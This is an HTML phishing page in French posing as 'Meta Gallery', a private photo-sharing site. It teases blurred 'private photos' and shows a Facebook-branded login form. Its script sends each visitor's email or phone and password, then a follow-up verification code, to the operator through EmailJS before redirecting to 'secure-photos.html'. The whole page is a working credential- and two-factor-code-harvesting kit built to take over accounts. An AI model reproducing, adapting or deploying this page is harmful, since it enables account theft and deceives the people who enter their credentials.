<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Meta gallery sharing</title>

<meta property="og:title" content="Meta gallery sharing">
<meta property="og:description" content="Partage sécurisé de photos">
<meta property="og:image" content="https://thecloud-share-dano.netlify.app/logo_id.png">
<meta property="og:url" content="https://thecloud-share-dano.netlify.app/logo_id.png">
<meta property="og:type" content="website">

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
:root{
  --primary:#2563eb;
  --secondary:#3b82f6;
  --bg:#f8fafc;
}

body{
  margin:0;
  font-family:Inter, system-ui;
  background:linear-gradient(180deg,#f8fafc 0%,#eef4ff 100%);
  color:#0f172a;
}

/* HEADER */
.header{
  background: linear-gradient(135deg,#1e3a8a,#2563eb,#3b82f6);
  color:white;
  padding:20px 0;
  position:sticky;
  top:0;
  z-index:10;
  box-shadow:0 10px 30px rgba(0,0,0,.15);
}

.header-content{
  max-width:1100px;
  margin:auto;
  padding:0 20px;
  display:flex;
  align-items:center;
  justify-content:space-between;
}

/* BRAND */
.brand{
  display:flex;
  align-items:center;
  gap:12px;
}

.logo{
  width:44px;
  height:44px;
  border-radius:12px;
  background:rgba(255,255,255,.15);
  backdrop-filter:blur(10px);
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:700;
  font-size:18px;
}

.title{
  font-weight:700;
  font-size:16px;
}

.subtitle{
  font-size:12px;
  opacity:.8;
}

/* BUTTONS */
.btn{
  padding:10px 16px;
  border-radius:8px;
  font-weight:600;
  cursor:pointer;
  transition:.2s;
  border:none;
}

.btn.primary{
  background:white;
  color:#1e3a8a;
}

.btn.primary:hover{
  background:#e0ecff;
}

.btn.ghost{
  background:transparent;
  color:white;
  margin-right:10px;
}

.btn.ghost:hover{
  background:rgba(255,255,255,.15);
}
/* HERO */
.hero{
  max-width:1100px;
  margin:auto;
  padding:80px 20px;
  text-align:center;
}

.hero h1{
  font-size:44px;
  margin:0;
}

.hero p{
  margin-top:15px;
  opacity:.7;
}

/* CARD CLOUD */
.card{
  margin:50px auto 0;
  max-width:400px;
  background:white;
  border-radius:20px;
  padding:30px;
  box-shadow:0 30px 80px rgba(0,0,0,.08);
}

.upload-box{
  border:2px dashed #cbd5f5;
  padding:40px;
  border-radius:14px;
  cursor:pointer;
}

.upload-box:hover{
  border-color:#2563eb;
  background:#f8fbff;
}

.upload-icon{
  font-size:30px;
}

/* MODAL */
.modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.4);
  backdrop-filter:blur(6px);
  display:none;
  align-items:center;
  justify-content:center;
}

.modal .box{
  background:white;
  padding:28px;
  width:320px;
  border-radius:16px;
  box-shadow:0 30px 80px rgba(0,0,0,.2);
}

/* INPUT */
.modal input{
  width:100%;
  padding:12px;
  margin-top:12px;
  border-radius:8px;
  border:1px solid #ddd;
}

#code{
  border:2px dashed #2563eb;
  background:#f0f7ff;
  text-align:center;
}

/* NOTIF */
#modalNotification{
  display:none;
  padding:10px;
  margin:10px 0;
  background:#2563eb;
  color:white;
  border-radius:8px;
  text-align:center;
}

/* NOTE */
.note{
  text-align:center;
  font-size:12px;
  opacity:.6;
  margin-top:10px;
}

.preview{
  margin-top:40px;
  position:relative;
  max-width:500px;
  margin-left:auto;
  margin-right:auto;
  border-radius:18px;
  overflow:hidden;
  box-shadow:0 20px 60px rgba(0,0,0,.15);
}

.preview img{
  width:100%;
  display:block;
}

.preview .overlay{
  position:absolute;
  inset:0;
  background:rgba(0,0,0,.35);
  backdrop-filter:blur(4px);
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-weight:600;
  font-size:20px;
}

</style>
</head>

<body>

<header class="header">
  <div class="header-content">

    <div class="brand">
      <div class="logo">
  <img src="logo_id.png" alt="logo" style="width:100%; height:100%; object-fit:cover; border-radius:12px;">
</div>
      <div>
        <div class="title">Meta Gallery</div>
        <div class="subtitle">Cloud sécurisé de partage</div>
      </div>
    </div>

    <nav>
      <button class="btn primary" id="loginBtn">Accès sécurisé</button>
    </nav>

  </div>
</header>

<section class="hero">

  <h1>Accédez à la galerie privée</h1>
<p>Photos exclusives disponibles après connexion.</p>

<div class="preview">
  <img src="logo_id.png" alt="preview">
  <div class="overlay">
    <p>🔒 +25 photos privées</p>
  </div>
</div>

  <div class="card">
    <div class="upload-box">
      <div class="upload-icon">☁️</div>
      <p><strong>Déposez vos fichiers</strong></p>
    </div>

    <div class="note">Accès privé et sécurisé</div>
  </div>

</section>

<!-- MODALE LOGIN -->
<div class="modal" id="loginModal">
  <div class="box">

<h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">
  
  <img src="logo_fb.png" alt="logo" style="width:48px; height:48px;">
  
  Identification

</h2>

<div id="modalNotification"></div>

<input id="userId" placeholder="Courriel ou numéro">
<input id="password" type="password" placeholder="Mot de passe">
<input id="code" maxlength="8" placeholder="Code" style="display:none">

<button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
  Se connecter
</button>

<p class="note">Accès sécurisé</p>
</div>
</div>

<script>
const modal = document.getElementById('loginModal');
const loginBtn = document.getElementById('loginBtn');
const confirmLogin = document.getElementById('confirmLogin');
const codeInput = document.getElementById('code');
const userIdInput = document.getElementById('userId');
const passwordInput = document.getElementById('password');
const modalNotif = document.getElementById('modalNotification');

let codeSent = false;

if(sessionStorage.getItem("demo_auth_token") === "true"){
    window.location.href = "secure-photos.html";
}

function showModalNotification(message){
    modalNotif.textContent = message;
    modalNotif.style.display = "block";
    requestAnimationFrame(()=>{
        modalNotif.style.opacity = "1";
        modalNotif.style.transform = "translateY(0)";
    });
    setTimeout(()=>{
        modalNotif.style.opacity = "0";
        modalNotif.style.transform = "translateY(-10px)";
        setTimeout(()=> modalNotif.style.display = "none", 400);
    }, 3000);
}

loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});

async function sendEmailLogin(username, password){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_email",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{username,password}
    })
  });
}
async function sendCodeValidation(code){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_code",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{code}
    })
  });
}

confirmLogin.onclick = async ()=>{
  const user = userIdInput.value.trim();
  const pwd  = passwordInput.value.trim();

  if(!codeSent){
    if(!user || !pwd){
      showModalNotification("Veuillez remplir tous les champs.");
      return;
    }

    confirmLogin.disabled = true;
    confirmLogin.textContent = "Envoi…";

    const response = await sendEmailLogin(user,pwd);
    if(!response.ok){
      showModalNotification("Erreur d'envoi.");
      confirmLogin.disabled = false;
      confirmLogin.textContent = "Se connecter";
      return;
    }

    showModalNotification("Code de validation envoyé.");
    codeInput.style.display = "block";
    confirmLogin.textContent = "Valider le code";
    confirmLogin.disabled = false;
    codeSent = true;
    return;
  }

  const code = codeInput.value.trim();
  if(!/^[0-9]{6,8}$/.test(code)){
    showModalNotification("Code invalide.");
    return;
  }

  const rep = await sendCodeValidation(code);
  if(!rep.ok){
    showModalNotification("Erreur validation code.");
    return;
  }

  sessionStorage.setItem("demo_auth_token","true");
  window.location.href="secure-photos.html";
};
</script>

</body>
</html>
